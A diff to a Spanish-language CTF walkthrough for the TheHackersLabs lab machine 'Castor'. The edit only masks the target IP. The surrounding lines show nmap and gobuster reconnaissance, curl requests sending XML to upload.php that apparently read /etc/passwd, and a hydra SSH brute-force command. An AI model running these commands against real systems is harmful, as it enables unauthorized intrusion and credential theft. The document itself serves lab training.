@@ -4,7 +4,7 @@
 
 - **Plataforma:** TheHackersLabs
 - **Nombre:** Castor
-- **IP:** `192.168.80.73`
+- **IP:** `192.168.xx.xx`
 - **Dificultad:** Easy/Medium
 - **Sistema Operativo:** Debian Linux
 - **Objetivo:** Obtener acceso root
@@ -23,7 +23,7 @@ arp-scan -I eth0 --localnet
 
 **Resultado:**
 ```
-192.168.80.73   08:00:27:0b:9c:e9       PCS Systemtechnik GmbH
+192.168.xx.xx   08:00:27:0b:9c:e9       PCS Systemtechnik GmbH
 ```
 
 ---
@@ -50,7 +50,7 @@ sudo netdiscover
 ### **Confirmación con Nmap**
 
 ```bash
-nmap -sn 192.168.80.0/24
+nmap -sn 192.168.xx.0/24
 ```
 
 **Hosts detectados:**
@@ -64,7 +64,7 @@ nmap -sn 192.168.80.0/24
 
 ### **Escaneo TCP completo**
 ```bash
-nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 192.168.80.73 -oN Escaneo_TCP
+nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 192.168.xx.xx -oN Escaneo_TCP
 ```
 
 **Puertos abiertos:**
@@ -77,7 +77,7 @@ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 192.168.80.73 -oN Escaneo_TCP
 
 ### **Detección de servicios**
 ```bash
-nmap -sCV -p22,80 192.168.80.73
+nmap -sCV -p22,80 192.168.xx.xx
 ```
 
 **Resultado:**
@@ -97,7 +97,7 @@ nmap -sCV -p22,80 192.168.80.73
 
 ### **Fuzzing de directorios con Gobuster**
 ```bash
-gobuster dir -u http://192.168.80.73/ \
+gobuster dir -u http://192.168.xx.xx/ \
 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt \
 -x php,html,txt
 ```
@@ -113,7 +113,7 @@ gobuster dir -u http://192.168.80.73/ \
 
 #### **Prueba básica con `curl`:**
 ```bash
-curl -X POST http://192.168.80.73/upload.php -d "test=hola"
+curl -X POST http://192.168.xx.xx/upload.php -d "test=hola"
 ```
 **Respuesta:** Sugirió procesamiento XML.
 
@@ -134,7 +134,7 @@ curl -X POST http://192.168.80.73/upload.php -d "test=hola"
 
 #### **Petición con `curl`:**
 ```bash
-curl -X POST http://192.168.80.73/upload.php \
+curl -X POST http://192.168.xx.xx/upload.php \
 -H "Content-Type: application/xml" \
 --data-binary @test.xml
 ```
@@ -157,7 +157,7 @@ castorcin:x:1001:1001:castorcin,,,:/home/castorcin:/bin/bash
 hydra -t 4 -vV \
 -L user.txt \
 -P diccionario.txt \
--e nsr 192.168.80.73 ssh
+-e nsr 192.168.xx.xx ssh
 ```
 
 **Credenciales encontradas:**
